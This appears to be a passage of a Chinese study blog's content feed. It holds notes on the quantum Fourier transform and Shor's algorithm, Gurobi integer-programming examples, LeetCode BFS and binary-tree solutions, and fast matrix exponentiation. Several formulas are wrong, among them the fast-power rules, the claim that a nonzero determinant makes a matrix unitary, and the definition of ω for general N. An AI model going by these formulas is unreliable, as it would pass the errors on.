\beta_{k}=\frac{1}{\sqrt{N}} \sum_{j=0}^{N-1} \alpha_{j} \mathrm{e}^{\frac{2 \pi i j k}{N}}=\frac{1}{2} \sum_{j=0}^{3} \alpha_{j} \mathrm{e}^{2 \pi i j k / 4}
$$

$$
\begin{aligned}
k=0:\ \ & \beta_{0}=\frac{1}{2} \sum_{j=0}^{3} \alpha_{j}=\frac{1}{2}\left(\alpha_{0}+\alpha_{1}+\alpha_{2}+\alpha_{3}\right) \\
\end{aligned}
$$

$$
k=1:\ \ \begin{aligned}
\beta_{1}=& \frac{1}{2} \sum_{j=0}^{3} \alpha_{j} \mathrm{e}^{\pi i j / 2}=\frac{1}{2}\left(\alpha_{0}+\alpha_{1} \mathrm{e}^{\frac{i \pi}{2}}+\alpha_{2} \mathrm{e}^{i \pi}+\alpha_{3} \mathrm{e}^{\frac{3 i \pi}{2}}\right) \\
\stackrel{Euler-e^{i x}=\cos x+i \sin x}{\longrightarrow}
=& \frac{1}{2}\left(\alpha_{0}+\alpha_{1} i-\alpha_{2}-\alpha_{3} i\right) \\
\end{aligned}
$$

$$
k=2:\ \ \begin{aligned}
\beta_{2} &=\frac{1}{2} \sum_{j=0}^{3} \alpha_{j} \mathrm{e}^{\pi i j}=\frac{1}{2}\left(\alpha_{0}+\alpha_{1} \mathrm{e}^{i \pi}+\alpha_{2} \mathrm{e}^{2 i \pi}+\alpha_{3} \mathrm{e}^{3 i \pi}\right) \\
\stackrel{Euler-e^{i x}=\cos x+i \sin x}{\longrightarrow}
&=\frac{1}{2}\left(\alpha_{0}-\alpha_{1}+\alpha_{2}-\alpha_{3}\right)
\end{aligned}
$$

$$
k=3:\ \ \begin{aligned}
\beta_{3} &=\frac{1}{2} \sum_{j=0}^{3} \alpha_{j} \mathrm{e}^{3 \pi i j / 2}=\frac{1}{2}\left(\alpha_{0}+\alpha_{1} \mathrm{e}^{\frac{3 i \pi}{2}}+\alpha_{2} \mathrm{e}^{3 i \pi}+\alpha_{3} \mathrm{e}^{\frac{9 i \pi}{2}}\right) \\
\stackrel{Euler-e^{i x}=\cos x+i \sin x}{\longrightarrow}
&=\frac{1}{2}\left(\alpha_{0}-\alpha_{1} i-\alpha_{2}+\alpha_{3} i\right)
\end{aligned}
$$

可以发现，所以 $\alpha_i$ 的系数都是 $\pm1.\pm{i}$ ，将其表示为矩阵：(矩阵可逆)
$$
\mathrm{QFT}_{4}=\frac{1}{2}\left(\begin{array}{cccc}
1 & 1 & 1 & 1 \\
1 & i & -1 & -i \\
1 & -1 & 1 & -1 \\
1 & -i & -1 & i
\end{array}\right)\stackrel{det}{\longrightarrow}-16i\ne0
$$
所以该矩阵是一个酉矩阵，$QFT$ 变换是一个酉变换，将该矩阵广义化，得到：
$$
\mathrm{QFT}_{N}=\frac{1}{\sqrt{N}}\left(\begin{array}{cccccc}
1 & 1 & 1 & 1 & \cdots & 1 \\
1 & \omega & \omega^{2} & \omega^{3} & \cdots & \omega^{N-1} \\
1 & \omega^{2} & \omega^{4} & \omega^{6} & \cdots & \omega^{2(N-1)} \\
\vdots & \vdots & \vdots & \vdots & \ddots & \vdots \\
1 & \omega^{N-1} & \omega^{2(N-1)} & \omega^{3(N-1)} & \ldots & \omega^{(N-1)(N-1)}
\end{array}\right)
$$

其中 $\omega^i$ 是幅度 $\omega^i=e^{i\pi/2}$，即上面的 $\alpha_i$ ，根据 Euler 公式可以算出：
$$
\omega^0=1\\
\omega^1=e^{\pi/2}=cos(\pi/2)+i*sin(\pi/2)=i\\
\omega^2=e^{2\pi/2}=cos(\pi)+i*sin(\pi)=-1\\
\omega^3=e^{3\pi/2}=cos(3\pi/2)+i*sin(3\pi/2)=-i\\
\omega^4=1,\omega^5=i,\omega^6=-1,\omega^7=-i,...
$$
总结上面的过程发现：

一个波函数，表示为一个量子状态 $|k\rangle$ （N位），经过一次 $QFT$ 变换：（公式化表示）

$$
|k\rangle\ \ \stackrel{QFT}{\rightarrow}\ \ \frac{1}{\sqrt{N}}\sum_{y=0}^{N-1} e^{2\pi i*(ky/N)}|y\rangle
$$

---



## 周期查找子程序


从原理上理解，傅里叶变换能够将时域信号转换到频域，从而将不同频段的信号分辨出来，而频域的参照是频率，在频域上每过一个周期图像上就会以其幅度凸显出来。（好像不对）

---



## shor算法流程


1. 构造 N 位($2^n=N$) 量子寄存器：

$$
|0^n\rangle|0^n\rangle
$$

2. 对第 1 个寄存器进行 N 次 Hadmard 变换，得到：

$$
\frac{1}{\sqrt{2^n}}\sum_{k=0}^{2^n-1}|x\rangle|0^n\rangle
$$

3. 作用 $U_f$ 变换到第 2 个量子寄存器上：

$$
\frac{1}{\sqrt{2^n}}\sum_{k=0}^{2^n-1}|x\rangle|f(x)\rangle=\frac{1}{\sqrt{2^n}}\sum_{k=0}^{2^n-1}|x\rangle|a^xmodN\rangle
$$

4. 测量第 2 个量子寄存器，此时整个量子态坍缩，第 2 个寄存器得到值 $f(x)=value$ ，此时第一个量子寄存器可以预测是哪些值 $|x_0+jr\rangle$ ，其中 $r$ 是函数 $f(x)=a^xmodN$ 的周期（注意这里 $|x_0+jr\rangle$ 只能取到 1 个值，概率为$|\sqrt{\frac{1}{2^n}}|^2$，只不过可以预测是哪些值令 $f(x)=value$ ）
5. 再对第 1 个量子寄存器进行量子傅里叶变换，又会得到叠加态：

$$
|x_0+jr\rangle\ \ \stackrel{QFT}{\rightarrow}\ \ \frac{1}{\sqrt{m}}\sum_{y=0}^{m-1} e^{2\pi i*((x_0+jr)y/N)}|y\rangle=\frac{1}{\sqrt{m}}\sum_{y=0}^{m-1} e^{2\pi i*((x_0)y/N)}\sum_{y=0}^{m-1} e^{2\pi i*((jr)y/N)}|y\rangle
$$

​    这里由于 $\sum_{y=0}^{N-1} e^{2\pi i*((x_0)y/N)}$ 是全局变量，这里忽略，（$\sqrt{\frac{1}{2^n}}$ 同样可以忽略）只考虑后面的部分测得的概率：
$$
|\frac{1}{\sqrt{m}}\sum_{y=0}^{m-1} e^{2\pi i*((jr)y/N)}|^2
$$
根据 $Euler$ 公式$(e^{xi}=cosx+isinx)$ 当且仅当 $x$ 取到整数时，该值最大，带入上式就是当 $y$ 是 $\frac{r}{N}$ 的倍数时幅度最大，这正是我们想要的。

<font color=green>（这里是为什么我还没懂qwq）</font>

<hr>
<h2 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h2><p>$m_{(2)}$ 位的数字需要 $n&gt;2m$ 个 $qubits$ 来进行分解，现在最大的量子计算机可用 $50$ 个量子比特(2020)，所以破解 RSA 还只是处于理论阶段。</p>
]]></content>
      <categories>
        <category>Cryptanalysis</category>
      </categories>
      <tags>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>Gurobi_1_ex_mip1</title>
    <url>/2022/05/30/Gurobi/Gurobi-1-ex-mip1/</url>
    <content><![CDATA[<h1 id="ex-mip1"><a href="#ex-mip1" class="headerlink" title="ex_mip1"></a>ex_mip1</h1><h2 id="求解问题"><a href="#求解问题" class="headerlink" title="求解问题"></a>求解问题</h2><script type="math/tex; mode=display">
\begin{array}{cl}
\max & x+y+2 z \\
\text { s.t. } & x+2 y+3 z \leq 4 \\
& x+y \geq 1 \\
& x, y, z \in\{0,1\}
\end{array}</script><h2 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gurobipy</span><br><span class="line"><span class="keyword">from</span> gurobipy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment">#需要对出错情况进行反馈，所以用 try</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#建一个模型</span></span><br><span class="line">    m = gurobipy.Model(<span class="string">&quot;mip1&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Model=&#x27;</span>,m)   <span class="comment">#Model= &lt;gurobi.Model Continuous instance mip1: 0 constrs, 0 vars, No parameter changes&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#定义变量</span></span><br><span class="line">    x = m.addVar(vtype=GRB.BINARY, name=<span class="string">&quot;x&quot;</span>)</span><br><span class="line">    y = m.addVar(vtype=GRB.BINARY, name=<span class="string">&quot;y&quot;</span>)</span><br><span class="line">    z = m.addVar(vtype=GRB.BINARY, name=<span class="string">&quot;z&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#目标函数</span></span><br><span class="line">    m.setObjective(x+y+<span class="number">2</span>*z, GRB.MAXIMIZE)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#约束条件</span></span><br><span class="line">    m.addConstr(x+<span class="number">2</span>*y+<span class="number">3</span>*z &lt;= <span class="number">4</span>, <span class="string">&#x27;c0&#x27;</span>)</span><br><span class="line">    m.addConstr(x+y &gt;= <span class="number">1</span>, <span class="string">&#x27;c1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#优化模型</span></span><br><span class="line">    m.optimize()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;new_Model=&#x27;</span>, m)  <span class="comment">#new_Model= &lt;gurobi.Model MIP instance mip1: 2 constrs, 3 vars, No parameter changes&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> m.getVars():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s %g&#x27;</span> % (v.VarName, v.X))</span><br><span class="line">    <span class="comment">#x 1</span></span><br><span class="line">    <span class="comment">#y 0</span></span><br><span class="line">    <span class="comment">#z 1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Obj: %g&#x27;</span> % m.ObjVal) <span class="comment">#Obj: 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> gurobipy.GurobiError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Error code &#x27;</span> + <span class="built_in">str</span>(e.errno) + <span class="string">&#x27;: &#x27;</span> + <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> AttributeError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Encountered an attribute error&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>参考：</p>
<p><a href="https://blog.csdn.net/WASEFADG/article/details/105261808">https://blog.csdn.net/WASEFADG/article/details/105261808</a></p>
]]></content>
      <categories>
        <category>MILP_Learning</category>
      </categories>
      <tags>
        <tag>Gurobi</tag>
      </tags>
  </entry>
  <entry>
    <title>Gurobi-2-ex-diet</title>
    <url>/2022/06/01/Gurobi/Gurobi-2-ex-diet/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>LC 5.23 t.675 Cut Off Trees for Golf Event</title>
    <url>/2022/05/25/Lc_daily/LC-5.23-t.675-Cut-Off-Trees-for-Golf-Event/</url>
    <content><![CDATA[<h4 id="5-23-675-为高尔夫比赛砍树"><a href="#5-23-675-为高尔夫比赛砍树" class="headerlink" title="5.23  675. 为高尔夫比赛砍树"></a>5.23  <a href="https://leetcode.cn/problems/cut-off-trees-for-golf-event/">675. 为高尔夫比赛砍树</a></h4><p>难度：困难</p>
<p>你被请来给一个要举办高尔夫比赛的树林砍树。树林由一个 <code>m x n</code> 的矩阵表示， 在这个矩阵中：</p>
<ul>
<li><code>0</code> 表示障碍，无法触碰</li>
<li><code>1</code> 表示地面，可以行走</li>
<li><code>比 1 大的数</code> 表示有树的单元格，可以行走，数值表示树的高度</li>
</ul>
<p>每一步，你都可以向上、下、左、右四个方向之一移动一个单位，如果你站的地方有一棵树，那么你可以决定是否要砍倒它。</p>
<p>你需要按照树的高度从低向高砍掉所有的树，每砍过一颗树，该单元格的值变为 <code>1</code>（即变为地面）。</p>
<p>你将从 <code>(0, 0)</code> 点开始工作，返回你砍完所有树需要走的最小步数。 如果你无法砍完所有的树，返回 <code>-1</code> 。</p>
<p>可以保证的是，没有两棵树的高度是相同的，并且你至少需要砍倒一棵树。</p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2020/11/26/trees1.jpg" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：forest = [[1,2,3],[0,0,4],[7,6,5]]</span><br><span class="line">输出：6</span><br><span class="line">解释：沿着上面的路径，你可以用 6 步，按从最矮到最高的顺序砍掉这些树。</span><br></pre></td></tr></table></figure>
<p><strong>示例 2：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2020/11/26/trees2.jpg" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：forest = [[1,2,3],[0,0,0],[7,6,5]]</span><br><span class="line">输出：-1</span><br><span class="line">解释：由于中间一行被障碍阻塞，无法访问最下面一行中的树。</span><br></pre></td></tr></table></figure>
<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：forest = [[2,3,4],[0,0,5],[8,7,6]]</span><br><span class="line">输出：6</span><br><span class="line">解释：可以按与示例 1 相同的路径来砍掉所有的树。</span><br><span class="line">(0,0) 位置的树，可以直接砍去，不用算步数。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>m == forest.length</code></li>
<li><code>n == forest[i].length</code></li>
<li><code>1 &lt;= m, n &lt;= 50</code></li>
<li><code>0 &lt;= forest[i][j] &lt;= 109</code></li>
</ul>
<h5 id="思路1：排序＋广搜"><a href="#思路1：排序＋广搜" class="headerlink" title="思路1：排序＋广搜"></a>思路1：排序＋广搜</h5><blockquote>
<p>类似 <a href="https://leetcode.cn/problems/pacific-atlantic-water-flow/">417. 太平洋大西洋水流问题</a> 都是四个方向的广搜，但限制条件不同</p>
<p>先将需要砍掉的树按照树高度排序，需要记录坐标和高度 <code>(index_x,index_y,height)</code>，然后使用广度优先从四个方向搜索，搜索之前建立<code>visit[]</code>数组记录是否搜索过，可以先建立方向列表或直接遍历，原理是 <code>((x+1,y),(x-1,y),(x,y+1),(x,y-1))</code> 将满足限制条件的点再次入队。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cutOffTree</span>(<span class="params">self, forest: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#广度优先搜素</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">bfs</span>(<span class="params">sx,sy,tx,ty</span>):</span><br><span class="line">            row = <span class="built_in">len</span>(forest)</span><br><span class="line">            col = <span class="built_in">len</span>(forest[<span class="number">0</span>])</span><br><span class="line">            queue = deque([(<span class="number">0</span>,sx,sy)])</span><br><span class="line">            visit = &#123;(sx,sy)&#125;</span><br><span class="line">            <span class="keyword">while</span> queue:</span><br><span class="line">                distance,x,y = queue.popleft()</span><br><span class="line">                <span class="keyword">if</span> x == tx <span class="keyword">and</span> y == ty:</span><br><span class="line">                    <span class="keyword">return</span> distance</span><br><span class="line">                <span class="keyword">for</span> nx,ny <span class="keyword">in</span> ((x+<span class="number">1</span>,y),(x-<span class="number">1</span>,y),(x,y+<span class="number">1</span>),(x,y-<span class="number">1</span>)):</span><br><span class="line">                    <span class="keyword">if</span> <span class="number">0</span>&lt;=nx&lt;row <span class="keyword">and</span> <span class="number">0</span>&lt;=ny&lt;col <span class="keyword">and</span> forest[nx][ny] <span class="keyword">and</span> (nx,ny) <span class="keyword">not</span> <span class="keyword">in</span> visit:</span><br><span class="line">                        visit.add((nx,ny))</span><br><span class="line">                        queue.append((distance+<span class="number">1</span>,nx,ny))</span><br><span class="line">                    <span class="comment">#print(&quot;queue:&quot;,queue)</span></span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#按照树的高度排序(indx_x,indx_y,height)</span></span><br><span class="line">        sort_trees = []</span><br><span class="line">        <span class="keyword">for</span> row,tree <span class="keyword">in</span> <span class="built_in">enumerate</span>(forest):</span><br><span class="line">            <span class="keyword">for</span> col,h <span class="keyword">in</span> <span class="built_in">enumerate</span>(tree):</span><br><span class="line">                <span class="keyword">if</span> h &gt; <span class="number">1</span>:</span><br><span class="line">                    sort_trees.append((row,col,h))</span><br><span class="line">        sort_trees = <span class="built_in">sorted</span>(sort_trees,key = <span class="keyword">lambda</span> x : x[<span class="number">2</span>])</span><br><span class="line">        <span class="built_in">print</span>(sort_trees)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        res = pre_x = pre_y = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x,y,h <span class="keyword">in</span> sort_trees:</span><br><span class="line">            d = bfs(pre_x,pre_y,x,y)</span><br><span class="line">            <span class="keyword">if</span> d &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">            res += d</span><br><span class="line">            pre_x,pre_y = x,y</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
<h5 id="矩阵类-BFS-的-demo"><a href="#矩阵类-BFS-的-demo" class="headerlink" title="矩阵类 BFS 的 demo"></a>矩阵类 BFS 的 demo</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">BFS</span>(<span class="params">sorce_val,target_val</span>):</span><br><span class="line">    row = <span class="built_in">len</span>(Matrix)</span><br><span class="line">    col = <span class="built_in">len</span>(Matrix[<span class="number">0</span>])</span><br><span class="line">    queue = deque([(need_val,indexs)])</span><br><span class="line">    visit = &#123;(pointer_index)&#125;</span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        <span class="comment">#Limit the values stored in the queue based on conditions</span></span><br><span class="line">        need_val,indexs = queue.popleft()	</span><br><span class="line">        <span class="keyword">if</span> get_the_target_pointer:</span><br><span class="line">            <span class="comment">#conditions of return</span></span><br><span class="line">            <span class="keyword">return</span> need_val	</span><br><span class="line">        <span class="keyword">for</span> next_pointer <span class="keyword">in</span> all_directions:</span><br><span class="line">        <span class="comment">#eg: for nx,ny in ((x+1,y),(x-1,y),(x,y+1),(x,y-1)):</span></span><br><span class="line">        	<span class="comment">#search in all directions</span></span><br><span class="line">            <span class="keyword">if</span> fulfillment_of_conditions:</span><br><span class="line">            <span class="comment">#eg: if 0&lt;=nx&lt;row and 0&lt;=ny&lt;col and forest[nx][ny] and (nx,ny) not in visit:</span></span><br><span class="line">            	<span class="comment">#**Judgment Conditions**</span></span><br><span class="line">                visit.add((next_pointer))</span><br><span class="line">                queue.append((changed_need_val,indexs))</span><br><span class="line">    <span class="keyword">return</span> situation_of_ERR_or_boundary</span><br></pre></td></tr></table></figure>
<h5 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h5><p>还可以用 Dijkstra 和 A*启发式算法求解，待续…</p>
]]></content>
      <categories>
        <category>LeetCode_daily</category>
      </categories>
      <tags>
        <tag>BFS</tag>
      </tags>
  </entry>
  <entry>
    <title>Gurobi_Outline</title>
    <url>/2022/05/30/Gurobi/Gurobi_Outline/</url>
    <content><![CDATA[<h1 id="Gurobi-建模的基本流程"><a href="#Gurobi-建模的基本流程" class="headerlink" title="Gurobi 建模的基本流程"></a>Gurobi 建模的基本流程</h1><p>这样定义会使整个模型易读</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = gurobipy.Model(<span class="string">&quot;Model_Name&quot;</span>)	<span class="comment">#模型</span></span><br><span class="line"></span><br><span class="line">var = m.addVar(vtype = var_type,name=<span class="string">&quot;var_name&quot;</span>)	<span class="comment">#增加变量</span></span><br><span class="line"><span class="comment">#...More vars</span></span><br><span class="line"></span><br><span class="line">m.setObject(objective_expression,objective_sense)	<span class="comment">#目标函数</span></span><br><span class="line"></span><br><span class="line">m.addConstr(constraint,constraint_name)	<span class="comment">#约束条件</span></span><br><span class="line"><span class="comment">#...More constraints</span></span><br><span class="line"></span><br><span class="line">m.optimize()	<span class="comment">#优化模型</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ossimg.yzitc.com/2022/05/30/930c4d13cf906.png"></p>
]]></content>
      <categories>
        <category>MILP_Learning</category>
      </categories>
      <tags>
        <tag>Gurobi</tag>
      </tags>
  </entry>
  <entry>
    <title>LC 5.24 t.965. Univalued Binary Tree</title>
    <url>/2022/05/25/Lc_daily/LC-5.24-t.965.-Univalued-Binary-Tree/</url>
    <content><![CDATA[<h4 id="965-单值二叉树"><a href="#965-单值二叉树" class="headerlink" title="965. 单值二叉树"></a><a href="https://leetcode.cn/problems/univalued-binary-tree/">965. 单值二叉树</a></h4><p>难度：简单</p>
<p>如果二叉树每个节点都具有相同的值，那么该二叉树就是<em>单值</em>二叉树。</p>
<p>只有给定的树是单值二叉树时，才返回 <code>true</code>；否则返回 <code>false</code>。</p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/screen-shot-2018-12-25-at-50104-pm.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：[1,1,1,1,1,null,1]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<p><strong>示例 2：</strong></p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/screen-shot-2018-12-25-at-50050-pm.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：[2,2,2,5,2]</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li>给定树的节点数范围是 <code>[1, 100]</code>。</li>
<li>每个节点的值都是整数，范围为 <code>[0, 99]</code> 。</li>
</ol>
<h5 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h5><ol>
<li><p>深度优先，在判断到不等值时返回 False，一直相等，到遍历完返回 True</p>
</li>
<li><p>使用集合，无论采取哪种遍历方式，将所有值加入集合，并在最后判断集合的长度是否为 1 即可</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isUnivalTree</span>(<span class="params">self, root: TreeNode</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="comment">#3 traverse</span></span><br><span class="line">        ttval = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">preorder</span>(<span class="params">root</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            ttval.add(root.val)</span><br><span class="line">            preorder(root.left)</span><br><span class="line">            preorder(root.right)</span><br><span class="line"></span><br><span class="line">        preorder(root)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(ttval) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        #DFS</span></span><br><span class="line"><span class="string">        if not root:</span></span><br><span class="line"><span class="string">            return True</span></span><br><span class="line"><span class="string">        if root.left:</span></span><br><span class="line"><span class="string">            if root.val != root.left.val or not self.isUnivalTree(root.left):</span></span><br><span class="line"><span class="string">                return False</span></span><br><span class="line"><span class="string">        if root.right:</span></span><br><span class="line"><span class="string">            if root.val != root.right.val or not self.isUnivalTree(root.right):</span></span><br><span class="line"><span class="string">                return False</span></span><br><span class="line"><span class="string">        return True</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h5 id="前中后序遍历的-demo"><a href="#前中后序遍历的-demo" class="headerlink" title="前中后序遍历的 demo"></a>前中后序遍历的 demo</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>(<span class="params">root</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment">#preorder(root)</span></span><br><span class="line">    order(root.left)</span><br><span class="line">    <span class="comment">#inorder(root)</span></span><br><span class="line">    order(root.right)</span><br><span class="line">    <span class="comment">#postorder(root)</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>LeetCode_daily</category>
      </categories>
      <tags>
        <tag>DFS</tag>
      </tags>
  </entry>
  <entry>
    <title>矩阵快速幂</title>
    <url>/2022/05/25/Algorithm/%E7%9F%A9%E9%98%B5%E5%BF%AB%E9%80%9F%E5%B9%82/</url>
    <content><![CDATA[<h1 id="矩阵快速幂"><a href="#矩阵快速幂" class="headerlink" title="矩阵快速幂"></a><strong>矩阵快速幂</strong></h1><h2 id="整数快速幂"><a href="#整数快速幂" class="headerlink" title="整数快速幂"></a>整数快速幂</h2><p>解释：计算模幂运算时，可用的规则有：</p>
<script type="math/tex; mode=display">
(a+b)\%m=(a\%m+b\%m)\%m\\
(a*b)\%m=(a\%m*b\%m)\%m</script><p>求幂次时可用将幂次拆分，如 $a^{b}$，</p>
<ul>
<li>b 为奇数时， $a^{b} = a^{b-1}*a^b$</li>
<li>b 为偶数时， $a^{b} = (a^2)^{b-1}$</li>
</ul>
<p>一般是在取模的情况下快速幂，否则会数据过大</p>
<p>例：求 $a^{b}\  \% \ c$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">b = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">c = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="comment"># a^b%c</span></span><br><span class="line">res = <span class="number">1</span>	<span class="comment">#初始为为单位元</span></span><br><span class="line"><span class="keyword">while</span> b&gt;<span class="number">0</span>:</span><br><span class="line">  <span class="keyword">if</span> b&amp;<span class="number">1</span>:</span><br><span class="line">    res = (res * a) % c</span><br><span class="line">  a = a*a</span><br><span class="line">  b &gt;&gt;= <span class="number">1</span> <span class="comment"># == b//2</span></span><br><span class="line">  <span class="comment">#print(a,b,res)</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h2 id="矩阵快速幂-1"><a href="#矩阵快速幂-1" class="headerlink" title="矩阵快速幂"></a>矩阵快速幂</h2><p>矩阵快速幂和整数快速幂原理相同，要求矩阵是方阵，以求斐波那契数列为例：</p>
<script type="math/tex; mode=display">
\left[\begin{array}{ll}
1 & 1 \\
1 & 0
\end{array}\right]\left[\begin{array}{c}
F(n) \\
F(n-1)
\end{array}\right]=\left[\begin{array}{c}
F(n)+F(n-1) \\
F(n)
\end{array}\right]=\left[\begin{array}{c}
F(n+1) \\
F(n)
\end{array}\right]</script><p>因此：</p>
<script type="math/tex; mode=display">
\left[ \begin{matrix} F(n + 1)\\ F(n) \end{matrix} \right] = \left[ \begin{matrix} 1 & 1 \\ 1 & 0 \end{matrix} \right] ^n \left[ \begin{matrix} F(1)\\ F(0) \end{matrix} \right]</script><p>令：</p>
<script type="math/tex; mode=display">
M = \left[ \begin{matrix} 1 & 1 \\ 1 & 0 \end{matrix} \right]</script><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">multiply_matrix</span>(<span class="params">a,b</span>):</span><br><span class="line">            <span class="comment">#a,b = matrix</span></span><br><span class="line">            <span class="comment">#return matrix</span></span><br><span class="line">            c=[[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">0</span>]]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    c[i][j] = (a[i][<span class="number">0</span>]*b[<span class="number">0</span>][j] + a[i][<span class="number">1</span>]*b[<span class="number">1</span>][j]) % <span class="number">1000000007</span></span><br><span class="line">                    <span class="built_in">print</span>(c)</span><br><span class="line">            <span class="keyword">return</span> c</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">pow_matrix</span>(<span class="params">a,n</span>):</span><br><span class="line">            <span class="comment">#初始化为单位阵，不会影响初始运算</span></span><br><span class="line">            res = [[<span class="number">1</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">1</span>]] </span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> n &amp; <span class="number">1</span>:</span><br><span class="line">                    res = multiply_matrix(res,a)</span><br><span class="line">                n &gt;&gt;= <span class="number">1</span>  <span class="comment">#右移一位相当于 ceil(n//2)</span></span><br><span class="line">                a = multiply_matrix(a,a)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span 